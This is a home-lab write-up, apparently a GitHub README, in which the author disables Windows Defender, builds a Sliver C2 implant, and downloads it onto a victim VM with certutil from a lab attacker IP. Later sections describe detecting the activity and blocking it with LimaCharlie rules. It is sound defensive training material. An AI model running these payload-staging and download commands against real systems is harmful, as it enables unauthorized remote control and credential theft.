# EDR-Attack-and-Defense-Lab

In this foundational SOC Home Lab I spun up a Win10 vm as my victim client and disabled Windows Defender EDR. Set up a C2 framework using Sliver for emulating threat-actor behavior by crafting my very own malicious payload. Threw attacks, caught the detections and watched the malicious traffic. Set up automated D&R rules to mitigate these attacks.

Eric Capuano's Guide: https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro?utm_campaign=post&utm_medium=web

### Setup:

First I spun up both virtual machines. The attack machine will run on Ubuntu Server, and the endpoint will be running Windows 11. In order for this lab to work smoothly I turned off all the Windows Security solutions (Virus & threat protection, Microsoft Defender Firewall, etc.) on the Windows 11 VM, making it my vulnerable victim machine. I am also going to be installing Sliver on the Ubuntu machine as my primary attack tool, and setting up LimaCharlie on the Windows machine as an EDR solution. LimaCharlie will have a sensor linked to the Windows machine, and will be importing sysmon logs.

### Skills Learned

- Advanced understanding of EDR concepts and practical application.
- Proficiency in analyzing and interpreting network telemetry.
- Ability to generate, deploy, transfer, and execute a Command & Control payload on the Windows endpoint using Sliver.
- Enhanced knowledge of Windows commands to gather information and assess system privileges.
- Familiarization with normal vs. anomalous activity to enhance threat detection capabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.
- Understanding the process of performing hash scans on sites like VirusTotal to identify known malware. As well as understanding false negative results when dealing with a newly crafted payload.
- Detection rule creation and response implementation on a SecOps Cloud Platform such as LimaCharlie.


### Tools Used

- LimaCharlie EDR for endpoint detection and response capabilities,
monitoring and capturing telemetry, creating and applying detection rules.
- Sysmon integrated with LimaCharlie for detailed network logging and event capture on the Windows endpoint.
- VirusTotal used for scanning and analyzing the hash of executables to identify known malware.
- Sliver C2 Server for crafting and deploying a malicious payload.

## Steps

*Ref 1: Windows Security controls off*

![image](https://github.com/user-attachments/assets/415b034b-db82-4da7-bdf9-88b55b2f52c3)

![image](https://github.com/user-attachments/assets/9d6597e1-a266-4ab8-8852-72c1754aeede)

![image](https://github.com/user-attachments/assets/0e89acb1-c5fe-4243-85f5-938961e2f978)

![Disabling WinDefender via Registry Editor](https://github.com/user-attachments/assets/4e244807-80e6-41bd-9445-be3569724400)

#### Now that my Windows machine is vulnerable, it's time to SSH into my Ubuntu AttackBox.

*Ref 2: Using PuTTY to connect via SSH*
![Screenshot 2024-09-02 113412](https://github.com/user-attachments/assets/97f91ab3-c686-439a-b0c2-6c7954162a34)

#### Once in my Ubuntu machine I use the _'sudo su'_ command to temporarily gain root access, navigate to the sliver directory and launch Sliver-server.

*Ref 3: Launching Sliver-server*

![image](https://github.com/user-attachments/assets/bb40665c-01da-4dda-a41b-4d2cfb7b4e79)

Using the command _'generate --http 192.168.247.129 --save /opt/sliver'_, I generate a Command & Control payload executable.

*Ref 3: Generating C2 session payload*

![SLIVER C2 payload GOOD_TWINE](https://github.com/user-attachments/assets/a1d170c5-f92d-4f9b-b112-41a524bf70ec)

![GOOD_TWINE implant](https://github.com/user-attachments/assets/5409a0bf-3760-48b1-a7be-91e6f5fc16c3)

Running the command _'implants'_ above, you’ll see it has created my payload with the random name **GOOD_TWINE**. 
_We will be using this payload to infect the Windows machine in the next step..._

#### I exited Sliver and made sure I was in the sliver directory. 
To download the C2 easily from the Linux VM to the Windows VM I spun up a temporary web server using Python

_'python3 -m http.server 80'_

![image](https://github.com/user-attachments/assets/14db0600-1b15-4087-a406-707710d04588)

#### I switched my attention to the Windows VM and launched an Administrative PowerShell console.
Executing the command _'certutil.exe -f -urlcache http://192.168.247.129/GOOD_TWINE.exe GOOD_TWINE.exe'_ starts the download of my payload.

![Malware Staged 2](https://github.com/user-attachments/assets/8fd84d5e-a28e-48cd-a13f-abc199bb91e3)


![We are In!](https://github.com/user-attachments/assets/299b4831-809b-474f-8e88-d56db49344c5)

#### Now that we are hosting a live session between the two machines, I input the commands _'info' 'getprivs'_ and _'ps -T'_ to check my remote user privileges, information on the victim machine, and see the specific security products used.
_In this case my victim machine is using Sysmon64 and Windows Smart Screen_.

![Inside the Windows machine](https://github.com/user-attachments/assets/0352ae0d-93e0-47cb-ae54-c729b6974974)

![Checking user privs](https://github.com/user-attachments/assets/4bf919a8-2b4f-4892-88e2-3a1a14a2b577)

![Identifying running processes in remote system](https://github.com/user-attachments/assets/a5abe060-f99e-404f-a6fa-2422107eb357)

#### We can see processes like _SeDebugPrivilege_ and _SeImpersonatePrivilege_ are Enabled, which means we are logged in as Admin.
![Implant admin privs on Windows machine](https://github.com/user-attachments/assets/628cf8ab-4473-40b4-9a46-36a155edf91c)


### Now time to go into Lima Charlie to see the noise!

Using my host machine I click the sensors tab, to see that my Windows machine is online.

![LimaCharlie Win11 vm Sensor](https://github.com/user-attachments/assets/683eea85-3abc-4784-878d-6666f4e0c2f7)

We can look inside our LimaCharlie SIEM and see telemetry from the attack. We can identify the payload thats running and see the IP its connected to.

![Unusual NOT signed process hmm](https://github.com/user-attachments/assets/ee04912e-9120-4411-a4f0-007de47cc5f9)
![Network Logs of our attack](https://github.com/user-attachments/assets/3ecf5dd1-1a41-4f31-8aec-ebd87f6debe6)
![Timeline of Execution](https://github.com/user-attachments/assets/dcc8720a-b590-4373-aa7c-9c017b1fa2ca)


We can also use LimaCharlie to scan the hash of the payload through VirusTotal; however, it will yield no results since we just created the brand new payload ourselves!

![Virus NOT Detected](https://github.com/user-attachments/assets/8bea1003-0e8a-4de4-ac38-7e980d2d1379)

Now on the attack machine we can simulate an attack to steal credentials by dumping the LSASS memory. In LimaCharlie we can check the sensors, observe the telemetry, and write rules to detect the sensitive process.

Part 4 - Blocking an attack

Now instead of simply detection, we can practice using LimaCharlie to write a rule that will detect and block the attacks coming from the Sliver server. On the Ubuntu machine we can simulate parts of a ransomware attack, by attempting to delete the volume shadow copies. In LimaCharlie we can view the telemetry and then write a rule that will block the attack entirely. After we create the rule in our SIEM, the Ubuntu machine will have no luck trying the same attack again.

Part 5 - Tuning false positives

Part 6 - Trigger YARA scans with a detection rule











